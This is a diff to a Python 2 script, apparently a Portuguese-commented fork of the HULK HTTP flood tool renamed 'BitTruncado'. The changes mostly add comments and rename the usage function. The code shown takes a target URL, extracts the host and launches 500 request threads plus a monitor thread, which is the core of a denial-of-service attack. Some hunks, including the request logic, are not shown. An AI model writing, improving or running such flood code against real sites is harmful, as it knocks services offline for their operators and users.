@@ -1,10 +1,10 @@
 #! /usr/bin/env python
 #----------------------------------------------------------------------------------------------
-#Modificacao do codigo HULK - HTTP Unbearable Load King - Barry Shteiman , version 1.0
+# Modificacao do codigo HULK - HTTP Unbearable Load King - Barry Shteiman , version 1.0
 #
 #  
-#Nova Versao autores: Rafael Viana
-#                     Ramon Santos
+# Nova Versao autores: Rafael Viana
+#                      Ramon Santos
 # 
 # ----------------------------------------------------------------------------------------------
 
@@ -15,9 +15,9 @@ import random #biblioteca que possue metodo randomico
 import re #biblioteca de expressoes regulares em python
 
 # variaveis globais.
-url='' #
-host=''
-headers_useragents=[]
+url='' # url do alvo
+host=''# host do alvo
+headers_useragents=[] # 
 headers_referers=[]
 request_counter=0
 flag=0
@@ -68,7 +68,7 @@ def buildblock(size):
 		out_str += chr(a)
 	return(out_str)
 
-def usage():
+def como_usar():
 	print '---------------------------------------------------'
 	print 'Usar: python BitTruncado.py <url>'
 	print '---------------------------------------------------'
@@ -131,11 +131,11 @@ class MonitorThread(threading.Thread):
 
 #execute 
 if len(sys.argv) < 2:
-	usage()
+	como_usar()
 	sys.exit()
 else:
-	if sys.argv[1]=="help":
-		usage()
+	if sys.argv[1]=="help": # ve se o segundo argumento e HELP
+		como_usar()
 		sys.exit()
 	else:
 		print "-- BiTruncado Force Ativado --"
@@ -143,12 +143,12 @@ else:
 			if sys.argv[2]=="safe":
 				set_safe()
 		url = sys.argv[1]
-		if url.count("/")==2:
-			url = url + "/"
-		m = re.search('http\://([^/]*)/?.*', url)
-		host = m.group(1)
-		for i in range(500):
+		if url.count("/")==2: # conta quantas / existe para saber se o parametro e http://
+			url = url + "/" # Adiciona uma / ao final do url 
+		m = re.search('http\://([^/]*)/?.*', url) #regex para tirar o www.etc do http://
+		host = m.group(1) #primeiro parametro que estiver separado da regex
+		for i in range(500): # cria 500 Thread 
 			t = HTTPThread()
 			t.start()
-		t = MonitorThread()
-		t.start()
+		t = MonitorThread() # cria o monitor de Theread
+		t.start() # inicia o monitor de Theread
